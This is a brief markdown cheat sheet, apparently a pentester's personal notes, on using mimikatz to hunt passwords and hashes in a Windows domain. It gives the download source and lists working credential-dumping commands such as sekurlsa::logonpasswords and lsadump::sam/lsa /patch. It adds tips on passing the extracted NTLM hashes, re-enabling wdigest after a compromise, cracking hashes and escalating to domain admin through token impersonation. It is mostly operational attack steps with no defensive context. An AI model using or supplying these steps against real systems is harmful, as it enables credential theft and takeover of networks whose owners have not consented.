# mimikatz

- Tool for password/Hash hunting
- Will be detected by antivirus

## installation

- download from https://github.com/gentilkiwi/mimikatz
- or use pypykatz

## usage

- Invoke-Mimikatz
- get mimikatz on an owned domain controller
- execute mimikatz (also read documentation in mimikatz wiki)
- privilege::debug
- sekurlsa::logonpasswords
  - NTLM-hashes will be given (not v2), so we can use this to pass the hash
  - also check wdigest (windows 7 and before)
	- you might be able to active it after a compromise
- lsadump::sam
- lsadump::sam /patch
- lsadump::lsa /patch -> more ntlm hashes
  - try to crack this, find out how good their password policy is

### dump stuff (when domain admin)

- must be domain admin to do this

Hint: can use incognito to get to high level domain admin account
